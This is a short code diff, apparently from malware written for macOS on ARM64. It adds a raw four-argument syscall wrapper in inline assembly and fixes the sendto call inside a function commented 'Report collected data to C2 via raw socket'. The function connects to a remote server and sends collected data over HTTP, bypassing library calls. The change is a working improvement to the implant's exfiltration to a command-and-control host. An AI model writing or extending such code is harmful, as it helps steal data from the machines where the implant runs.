@@ -50,6 +50,15 @@ static long syscall3(long n, long a, long b, long c) {
     __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
     return x0;
 }
+static long syscall4(long n, long a, long b, long c, long d) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    register long x1 __asm__("x1") = b;
+    register long x2 __asm__("x2") = c;
+    register long x3 __asm__("x3") = d;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory");
+    return x0;
+}
 
 /* Report collected data to C2 via raw socket */
 static void report(const char *data, int len) {
@@ -92,7 +101,7 @@ static void report(const char *data, int len) {
     };
     
     syscall3(SYS_connect, sock, (long)addr, 16);
-    syscall3(SYS_sendto, sock, (long)http, h, 0);
+    syscall4(SYS_sendto, sock, (long)http, h, 0);
     syscall1(SYS_close, sock);
 }
 
